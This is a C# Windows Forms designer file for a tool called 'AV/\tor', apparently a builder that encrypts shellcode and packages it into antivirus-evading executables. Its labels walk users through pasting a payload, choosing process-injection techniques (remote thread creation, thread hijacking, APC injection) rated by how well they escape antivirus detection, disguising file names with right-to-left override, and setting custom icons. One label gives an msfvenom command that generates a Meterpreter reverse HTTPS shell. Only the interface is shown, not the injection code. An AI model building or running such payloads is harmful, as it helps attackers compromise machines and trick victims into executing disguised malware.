namespace AvIator
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
            this.keyBox = new System.Windows.Forms.TextBox();
            this.ivBox = new System.Windows.Forms.TextBox();
            this.payloadBox = new System.Windows.Forms.TextBox();
            this.label1 = new System.Windows.Forms.Label();
            this.label2 = new System.Windows.Forms.Label();
            this.label3 = new System.Windows.Forms.Label();
            this.label4 = new System.Windows.Forms.Label();
            this.resultBox = new System.Windows.Forms.TextBox();
            this.encryptPayload = new System.Windows.Forms.Button();
            this.genExe = new System.Windows.Forms.Button();
            this.label5 = new System.Windows.Forms.Label();
            this.label6 = new System.Windows.Forms.Label();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.linkLabel1 = new System.Windows.Forms.LinkLabel();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.label15 = new System.Windows.Forms.Label();
            this.label14 = new System.Windows.Forms.Label();
            this.label9 = new System.Windows.Forms.Label();
            this.label7 = new System.Windows.Forms.Label();
            this.button1 = new System.Windows.Forms.Button();
            this.label8 = new System.Windows.Forms.Label();
            this.groupBox2 = new System.Windows.Forms.GroupBox();
            this.archX64 = new System.Windows.Forms.RadioButton();
            this.archX86 = new System.Windows.Forms.RadioButton();
            this.label10 = new System.Windows.Forms.Label();
            this.label11 = new System.Windows.Forms.Label();
            this.groupBox3 = new System.Windows.Forms.GroupBox();
            this.APCInjectionCheckBox = new System.Windows.Forms.RadioButton();
            this.label12 = new System.Windows.Forms.Label();
            this.threadHijackin_x86 = new System.Windows.Forms.RadioButton();
            this.injectExistingApp = new System.Windows.Forms.RadioButton();
            this.threadHijacking_option = new System.Windows.Forms.RadioButton();
            this.procBox = new System.Windows.Forms.TextBox();
            this.virtualAllocEx_Option = new System.Windows.Forms.RadioButton();
            this.virtualAlloc_Option = new System.Windows.Forms.RadioButton();
            this.groupBox4 = new System.Windows.Forms.GroupBox();
            this.button2 = new System.Windows.Forms.Button();
            this.RTLOCheckBox = new System.Windows.Forms.CheckBox();
            this.label13 = new System.Windows.Forms.Label();
            this.tabControl1 = new System.Windows.Forms.TabControl();
            this.tabPage1 = new System.Windows.Forms.TabPage();
            this.tabPage2 = new System.Windows.Forms.TabPage();
            this.RTLOtip = new System.Windows.Forms.ToolTip(this.components);
            this.groupBox1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.groupBox2.SuspendLayout();
            this.groupBox3.SuspendLayout();
            this.groupBox4.SuspendLayout();
            this.tabControl1.SuspendLayout();
            this.tabPage1.SuspendLayout();
            this.SuspendLayout();
            // 
            // keyBox
            // 
            this.keyBox.Location = new System.Drawing.Point(82, 38);
            this.keyBox.Name = "keyBox";
            this.keyBox.Size = new System.Drawing.Size(844, 20);
            this.keyBox.TabIndex = 0;
            this.keyBox.Text = "0x11,0x22,0x11,0x00,0x00,0x01,0xd0,0x00,0x00,0x11,0x00,0x00,0x00,0x00,0x00,0x11,0" +
    "x00,0x11,0x01,0x11,0x11,0x00,0x00";
            // 
            // ivBox
            // 
            this.ivBox.Location = new System.Drawing.Point(82, 77);
            this.ivBox.Name = "ivBox";
            this.ivBox.Size = new System.Drawing.Size(844, 20);
            this.ivBox.TabIndex = 1;
            this.ivBox.Text = "0x00,0xcc,0x00,0x00,0x00,0xcc";
            // 
            // payloadBox
            // 
            this.payloadBox.Location = new System.Drawing.Point(82, 109);
            this.payloadBox.Multiline = true;
            this.payloadBox.Name = "payloadBox";
            this.payloadBox.Size = new System.Drawing.Size(844, 66);
            this.payloadBox.TabIndex = 2;
            this.payloadBox.Text = resources.GetString("payloadBox.Text");
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(11, 38);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(274, 13);
            this.label1.TabIndex = 3;
            this.label1.Text = "1. Enter an Encryption Key or leave the default";
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(11, 77);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(201, 13);
            this.label2.TabIndex = 4;
            this.label2.Text = "2. Enter an IV or leave the default";
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Location = new System.Drawing.Point(11, 112);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(221, 13);
            this.label3.TabIndex = 5;
            this.label3.Text = "3. Paste the Shellcode in the text box";
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Location = new System.Drawing.Point(88, 205);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(96, 13);
            this.label4.TabIndex = 6;
            this.label4.Text = "Encrypted Payload";
            // 
            // resultBox
            // 
            this.resultBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.resultBox.Location = new System.Drawing.Point(82, 219);
            this.resultBox.Multiline = true;
            this.resultBox.Name = "resultBox";
            this.resultBox.ReadOnly = true;
            this.resultBox.Size = new System.Drawing.Size(842, 78);
            this.resultBox.TabIndex = 7;
            // 
            // encryptPayload
            // 
            this.encryptPayload.Location = new System.Drawing.Point(799, 179);
            this.encryptPayload.Name = "encryptPayload";
            this.encryptPayload.Size = new System.Drawing.Size(119, 23);
            this.encryptPayload.TabIndex = 8;
            this.encryptPayload.Text = "Encrypt";
            this.encryptPayload.UseVisualStyleBackColor = true;
            this.encryptPayload.Click += new System.EventHandler(this.buton1_click);
            // 
            // genExe
            // 
            this.genExe.Location = new System.Drawing.Point(717, 252);
            this.genExe.Name = "genExe";
            this.genExe.Size = new System.Drawing.Size(119, 23);
            this.genExe.TabIndex = 9;
            this.genExe.Text = "Generate Exe";
            this.genExe.UseVisualStyleBackColor = true;
            this.genExe.Click += new System.EventHandler(this.button2_Click);
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Location = new System.Drawing.Point(22, 137);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(236, 65);
            this.label5.TabIndex = 10;
            this.label5.Text = "(e.g. msfvenom -p windows/meterpreter/\r\n\r\nreverse_https LHOST=192.168.1.2 \r\n\r\nLPO" +
    "RT=4444 -f csharp)";
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.Location = new System.Drawing.Point(11, 219);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(156, 13);
            this.label6.TabIndex = 11;
            this.label6.Text = "4. Click on Encrypt Button";
            // 
            // groupBox1
            // 
            this.groupBox1.BackColor = System.Drawing.SystemColors.ActiveCaption;
            this.groupBox1.Controls.Add(this.linkLabel1);
            this.groupBox1.Controls.Add(this.pictureBox1);
            this.groupBox1.Controls.Add(this.label15);
            this.groupBox1.Controls.Add(this.label14);
            this.groupBox1.Controls.Add(this.label9);
            this.groupBox1.Controls.Add(this.label5);
            this.groupBox1.Controls.Add(this.label7);
            this.groupBox1.Controls.Add(this.label6);
            this.groupBox1.Controls.Add(this.label3);
            this.groupBox1.Controls.Add(this.label2);
            this.groupBox1.Controls.Add(this.label1);
            this.groupBox1.FlatStyle = System.Windows.Forms.FlatStyle.Popup;
            this.groupBox1.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.groupBox1.ForeColor = System.Drawing.SystemColors.ButtonHighlight;
            this.groupBox1.Location = new System.Drawing.Point(-4, 0);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new System.Drawing.Size(307, 735);
            this.groupBox1.TabIndex = 12;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "INSTRUCTIONS";
            this.groupBox1.Enter += new System.EventHandler(this.groupBox1_Enter);
            // 
            // linkLabel1
            // 
            this.linkLabel1.AutoSize = true;
            this.linkLabel1.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.linkLabel1.Location = new System.Drawing.Point(27, 655);
            this.linkLabel1.Name = "linkLabel1";
            this.linkLabel1.Size = new System.Drawing.Size(231, 17);
            this.linkLabel1.TabIndex = 23;
            this.linkLabel1.TabStop = true;
            this.linkLabel1.Text = "Follow me on twitter:  @Ch0pin";
            this.linkLabel1.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.linkLabel1_LinkClicked);
            // 
            // pictureBox1
            // 
            this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
            this.pictureBox1.Location = new System.Drawing.Point(94, 545);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(112, 98);
            this.pictureBox1.TabIndex = 22;
            this.pictureBox1.TabStop = false;
            // 
            // label15
            // 
            this.label15.AutoSize = true;
            this.label15.Location = new System.Drawing.Point(11, 351);
            this.label15.Name = "label15";
            this.label15.Size = new System.Drawing.Size(196, 13);
            this.label15.TabIndex = 21;
            this.label15.Text = "8. Press the Generate Exe button";
            // 
            // label14
            // 
            this.label14.AutoSize = true;
            this.label14.Location = new System.Drawing.Point(11, 323);
            this.label14.Name = "label14";
            this.label14.Size = new System.Drawing.Size(170, 13);
            this.label14.TabIndex = 20;
            this.label14.Text = "7. Select injection technique";
            // 
            // label9
            // 
            this.label9.AutoSize = true;
            this.label9.Location = new System.Drawing.Point(11, 293);
            this.label9.Name = "label9";
            this.label9.Size = new System.Drawing.Size(131, 13);
            this.label9.TabIndex = 13;
            this.label9.Text = "6. Select Architecture";
            // 
            // label7
            // 
            this.label7.AutoSize = true;
            this.label7.Location = new System.Drawing.Point(11, 256);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(195, 13);
            this.label7.TabIndex = 12;
            this.label7.Text = "5. Enter the path to save the exe";
            // 
            // button1
            // 
            this.button1.Location = new System.Drawing.Point(82, 313);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(119, 23);
            this.button1.TabIndex = 13;
            this.button1.Text = "Select path";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // label8
            // 
            this.label8.AutoSize = true;
            this.label8.Location = new System.Drawing.Point(454, 321);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(32, 13);
            this.label8.TabIndex = 14;
            this.label8.Text = "Path:";
            // 
            // groupBox2
            // 
            this.groupBox2.Controls.Add(this.archX64);
            this.groupBox2.Controls.Add(this.archX86);
            this.groupBox2.Location = new System.Drawing.Point(82, 351);
            this.groupBox2.Name = "groupBox2";
            this.groupBox2.Size = new System.Drawing.Size(842, 47);
            this.groupBox2.TabIndex = 13;
            this.groupBox2.TabStop = false;
            this.groupBox2.Text = "Target OS Architecture";
            // 
            // archX64
            // 
            this.archX64.AutoSize = true;
            this.archX64.Location = new System.Drawing.Point(77, 19);
            this.archX64.Name = "archX64";
            this.archX64.Size = new System.Drawing.Size(42, 17);
            this.archX64.TabIndex = 1;
            this.archX64.Text = "x64";
            this.archX64.UseVisualStyleBackColor = true;
            // 
            // archX86
            // 
            this.archX86.AutoSize = true;
            this.archX86.Checked = true;
            this.archX86.Location = new System.Drawing.Point(13, 19);
            this.archX86.Name = "archX86";
            this.archX86.Size = new System.Drawing.Size(42, 17);
            this.archX86.TabIndex = 0;
            this.archX86.TabStop = true;
            this.archX86.Text = "x86";
            this.archX86.UseVisualStyleBackColor = true;
            // 
            // label10
            // 
            this.label10.AutoSize = true;
            this.label10.Location = new System.Drawing.Point(28, 41);
            this.label10.Name = "label10";
            this.label10.Size = new System.Drawing.Size(48, 13);
            this.label10.TabIndex = 15;
            this.label10.Text = "AES key";
            // 
            // label11
            // 
            this.label11.AutoSize = true;
            this.label11.Location = new System.Drawing.Point(59, 80);
            this.label11.Name = "label11";
            this.label11.Size = new System.Drawing.Size(17, 13);
            this.label11.TabIndex = 16;
            this.label11.Text = "IV";
            // 
            // groupBox3
            // 
            this.groupBox3.Controls.Add(this.APCInjectionCheckBox);
            this.groupBox3.Controls.Add(this.label12);
            this.groupBox3.Controls.Add(this.threadHijackin_x86);
            this.groupBox3.Controls.Add(this.genExe);
            this.groupBox3.Controls.Add(this.injectExistingApp);
            this.groupBox3.Controls.Add(this.threadHijacking_option);
            this.groupBox3.Controls.Add(this.procBox);
            this.groupBox3.Controls.Add(this.virtualAllocEx_Option);
            this.groupBox3.Controls.Add(this.virtualAlloc_Option);
            this.groupBox3.Location = new System.Drawing.Point(82, 404);
            this.groupBox3.Name = "groupBox3";
            this.groupBox3.Size = new System.Drawing.Size(842, 316);
            this.groupBox3.TabIndex = 17;
            this.groupBox3.TabStop = false;
            this.groupBox3.Text = "Injection Techniques";
            // 
            // APCInjectionCheckBox
            // 
            this.APCInjectionCheckBox.AutoSize = true;
            this.APCInjectionCheckBox.Location = new System.Drawing.Point(13, 262);
            this.APCInjectionCheckBox.Name = "APCInjectionCheckBox";
            this.APCInjectionCheckBox.Size = new System.Drawing.Size(440, 30);
            this.APCInjectionCheckBox.TabIndex = 11;
            this.APCInjectionCheckBox.TabStop = true;
            this.APCInjectionCheckBox.Text = "Queue User APC to Alertable Thread (Shellcode Arch: x64, OS ARch: x64)\r\n+++High s" +
    "uccess rate and stable execution, depending on the target procedure given :))\r\n";
            this.APCInjectionCheckBox.UseVisualStyleBackColor = true;
            this.APCInjectionCheckBox.CheckedChanged += new System.EventHandler(this.APCInjectionCheckBox_CheckedChanged);
            // 
            // label12
            // 
            this.label12.AutoSize = true;
            this.label12.Location = new System.Drawing.Point(579, 236);
            this.label12.Name = "label12";
            this.label12.Size = new System.Drawing.Size(93, 13);
            this.label12.TabIndex = 10;
            this.label12.Text = "Target Procedure:";
            // 
            // threadHijackin_x86
            // 
            this.threadHijackin_x86.AutoSize = true;
            this.threadHijackin_x86.Location = new System.Drawing.Point(13, 208);
            this.threadHijackin_x86.Name = "threadHijackin_x86";
            this.threadHijackin_x86.Size = new System.Drawing.Size(448, 30);
            this.threadHijackin_x86.TabIndex = 5;
            this.threadHijackin_x86.TabStop = true;
            this.threadHijackin_x86.Text = "Thread Hijacking (Shellcode Arch: x86, OS Arch: x86)\r\n+++ High success Rate and s" +
    "table execution, depending on the target procedure given :))";
            this.threadHijackin_x86.UseVisualStyleBackColor = true;
            this.threadHijackin_x86.CheckedChanged += new System.EventHandler(this.threadHijackin_x86_CheckedChanged);
            // 
            // injectExistingApp
            // 
            this.injectExistingApp.AutoSize = true;
            this.injectExistingApp.Location = new System.Drawing.Point(13, 102);
            this.injectExistingApp.Name = "injectExistingApp";
            this.injectExistingApp.Size = new System.Drawing.Size(711, 43);
            this.injectExistingApp.TabIndex = 4;
            this.injectExistingApp.TabStop = true;
            this.injectExistingApp.Text = resources.GetString("injectExistingApp.Text");
            this.injectExistingApp.UseVisualStyleBackColor = true;
            this.injectExistingApp.CheckedChanged += new System.EventHandler(this.injectExistingApp_CheckedChanged);
            // 
            // threadHijacking_option
            // 
            this.threadHijacking_option.AutoSize = true;
            this.threadHijacking_option.Location = new System.Drawing.Point(13, 163);
            this.threadHijacking_option.Name = "threadHijacking_option";
            this.threadHijacking_option.Size = new System.Drawing.Size(523, 30);
            this.threadHijacking_option.TabIndex = 3;
            this.threadHijacking_option.TabStop = true;
            this.threadHijacking_option.Text = "Thread Hijacking targeting the procedure given in the text box bellow (Shellcode " +
    "Arch: x64, OS Arch: x64)\r\n++++ High Success Rate and stable execution :)))";
            this.threadHijacking_option.UseVisualStyleBackColor = true;
            this.threadHijacking_option.CheckedChanged += new System.EventHandler(this.threadHijacking_option_CheckedChanged);
            // 
            // procBox
            // 
            this.procBox.Enabled = false;
            this.procBox.Location = new System.Drawing.Point(582, 252);
            this.procBox.Name = "procBox";
            this.procBox.Size = new System.Drawing.Size(118, 20);
            this.procBox.TabIndex = 2;
            this.procBox.Text = "none";
            this.procBox.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // virtualAllocEx_Option
            // 
            this.virtualAllocEx_Option.AutoSize = true;
            this.virtualAllocEx_Option.Location = new System.Drawing.Point(13, 66);
            this.virtualAllocEx_Option.Name = "virtualAllocEx_Option";
            this.virtualAllocEx_Option.Size = new System.Drawing.Size(786, 30);
            this.virtualAllocEx_Option.TabIndex = 1;
            this.virtualAllocEx_Option.TabStop = true;
            this.virtualAllocEx_Option.Text = resources.GetString("virtualAllocEx_Option.Text");
            this.virtualAllocEx_Option.UseVisualStyleBackColor = true;
            this.virtualAllocEx_Option.CheckedChanged += new System.EventHandler(this.virtualAllocEx_Option_CheckedChanged);
            // 
            // virtualAlloc_Option
            // 
            this.virtualAlloc_Option.AutoSize = true;
            this.virtualAlloc_Option.Checked = true;
            this.virtualAlloc_Option.Location = new System.Drawing.Point(13, 19);
            this.virtualAlloc_Option.Name = "virtualAlloc_Option";
            this.virtualAlloc_Option.Size = new System.Drawing.Size(573, 30);
            this.virtualAlloc_Option.TabIndex = 0;
            this.virtualAlloc_Option.TabStop = true;
            this.virtualAlloc_Option.Text = "Creates a new thread in memory using the CreateThread API Function (Shellcode Arc" +
    "h: x86, x64, OS Arch: x86, x64)\r\n+ Stable execution but can be traced by most AV" +
    "s :((((\r\n";
            this.virtualAlloc_Option.UseVisualStyleBackColor = true;
            // 
            // groupBox4
            // 
            this.groupBox4.BackColor = System.Drawing.SystemColors.Control;
            this.groupBox4.Controls.Add(this.button2);
            this.groupBox4.Controls.Add(this.RTLOCheckBox);
            this.groupBox4.Controls.Add(this.label13);
            this.groupBox4.Controls.Add(this.groupBox3);
            this.groupBox4.Controls.Add(this.label11);
            this.groupBox4.Controls.Add(this.groupBox2);
            this.groupBox4.Controls.Add(this.label10);
            this.groupBox4.Controls.Add(this.label8);
            this.groupBox4.Controls.Add(this.resultBox);
            this.groupBox4.Controls.Add(this.button1);
            this.groupBox4.Controls.Add(this.payloadBox);
            this.groupBox4.Controls.Add(this.encryptPayload);
            this.groupBox4.Controls.Add(this.keyBox);
            this.groupBox4.Controls.Add(this.label4);
            this.groupBox4.Controls.Add(this.ivBox);
            this.groupBox4.Location = new System.Drawing.Point(301, 0);
            this.groupBox4.Name = "groupBox4";
            this.groupBox4.Size = new System.Drawing.Size(1040, 726);
            this.groupBox4.TabIndex = 18;
            this.groupBox4.TabStop = false;
            this.groupBox4.Text = "PREFERENCES";
            this.groupBox4.Enter += new System.EventHandler(this.groupBox4_Enter);
            // 
            // button2
            // 
            this.button2.Location = new System.Drawing.Point(799, 311);
            this.button2.Name = "button2";
            this.button2.Size = new System.Drawing.Size(119, 25);
            this.button2.TabIndex = 20;
            this.button2.Text = "Set Custom Icon";
            this.button2.UseVisualStyleBackColor = true;
            this.button2.Click += new System.EventHandler(this.button2_Click_1);
            // 
            // RTLOCheckBox
            // 
            this.RTLOCheckBox.AutoSize = true;
            this.RTLOCheckBox.Location = new System.Drawing.Point(229, 317);
            this.RTLOCheckBox.Name = "RTLOCheckBox";
            this.RTLOCheckBox.Size = new System.Drawing.Size(187, 17);
            this.RTLOCheckBox.TabIndex = 19;
            this.RTLOCheckBox.Text = "Use Right to Left Override (RTLO)";
            this.RTLOCheckBox.UseVisualStyleBackColor = true;
            // 
            // label13
            // 
            this.label13.AutoSize = true;
            this.label13.Location = new System.Drawing.Point(31, 112);
            this.label13.Name = "label13";
            this.label13.Size = new System.Drawing.Size(45, 13);
            this.label13.TabIndex = 18;
            this.label13.Text = "Payload";
            // 
            // tabControl1
            // 
            this.tabControl1.Controls.Add(this.tabPage1);
            this.tabControl1.Controls.Add(this.tabPage2);
            this.tabControl1.Location = new System.Drawing.Point(12, 12);
            this.tabControl1.Name = "tabControl1";
            this.tabControl1.SelectedIndex = 0;
            this.tabControl1.Size = new System.Drawing.Size(1253, 748);
            this.tabControl1.TabIndex = 19;
            // 
            // tabPage1
            // 
            this.tabPage1.Controls.Add(this.groupBox4);
            this.tabPage1.Controls.Add(this.groupBox1);
            this.tabPage1.Location = new System.Drawing.Point(4, 22);
            this.tabPage1.Name = "tabPage1";
            this.tabPage1.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage1.Size = new System.Drawing.Size(1245, 722);
            this.tabPage1.TabIndex = 0;
            this.tabPage1.Text = "Shellcode Injection";
            this.tabPage1.UseVisualStyleBackColor = true;
            // 
            // tabPage2
            // 
            this.tabPage2.Location = new System.Drawing.Point(4, 22);
            this.tabPage2.Name = "tabPage2";
            this.tabPage2.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage2.Size = new System.Drawing.Size(1245, 722);
            this.tabPage2.TabIndex = 1;
            this.tabPage2.Text = "Advanced (TODO)";
            this.tabPage2.UseVisualStyleBackColor = true;
            // 
            // RTLOtip
            // 
            this.RTLOtip.BackColor = System.Drawing.SystemColors.Window;
            this.RTLOtip.IsBalloon = true;
            this.RTLOtip.ToolTipTitle = "About RTLO";
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(1308, 763);
            this.Controls.Add(this.tabControl1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.Fixed3D;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MaximizeBox = false;
            this.Name = "Form1";
            this.Text = "AV/\\tor";
            this.Load += new System.EventHandler(this.Form1_Load);
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.groupBox2.ResumeLayout(false);
            this.groupBox2.PerformLayout();
            this.groupBox3.ResumeLayout(false);
            this.groupBox3.PerformLayout();
            this.groupBox4.ResumeLayout(false);
            this.groupBox4.PerformLayout();
            this.tabControl1.ResumeLayout(false);
            this.tabPage1.ResumeLayout(false);
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.TextBox keyBox;
        private System.Windows.Forms.TextBox ivBox;
        private System.Windows.Forms.TextBox payloadBox;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.Label label4;
        private System.Windows.Forms.TextBox resultBox;
        private System.Windows.Forms.Button encryptPayload;
        private System.Windows.Forms.Button genExe;
        private System.Windows.Forms.Label label5;
        private System.Windows.Forms.Label label6;
        private System.Windows.Forms.GroupBox groupBox1;
        private System.Windows.Forms.Label label7;
        private System.Windows.Forms.Button button1;
        private System.Windows.Forms.Label label8;
        private System.Windows.Forms.GroupBox groupBox2;
        private System.Windows.Forms.RadioButton archX64;
        private System.Windows.Forms.RadioButton archX86;
        private System.Windows.Forms.Label label9;
        private System.Windows.Forms.Label label10;
        private System.Windows.Forms.Label label11;
        private System.Windows.Forms.GroupBox groupBox3;
        private System.Windows.Forms.RadioButton virtualAlloc_Option;
        private System.Windows.Forms.GroupBox groupBox4;
        private System.Windows.Forms.RadioButton virtualAllocEx_Option;
        private System.Windows.Forms.TextBox procBox;
        private System.Windows.Forms.TabControl tabControl1;
        private System.Windows.Forms.TabPage tabPage1;
        private System.Windows.Forms.TabPage tabPage2;
        private System.Windows.Forms.RadioButton threadHijacking_option;
        private System.Windows.Forms.RadioButton injectExistingApp;
        private System.Windows.Forms.RadioButton threadHijackin_x86;
        private System.Windows.Forms.Label label15;
        private System.Windows.Forms.Label label14;
        private System.Windows.Forms.Label label12;
        private System.Windows.Forms.Label label13;
        private System.Windows.Forms.CheckBox RTLOCheckBox;
        private System.Windows.Forms.ToolTip RTLOtip;
        private System.Windows.Forms.PictureBox pictureBox1;
        private System.Windows.Forms.LinkLabel linkLabel1;
        private System.Windows.Forms.Button button2;
        private System.Windows.Forms.RadioButton APCInjectionCheckBox;
    }
}

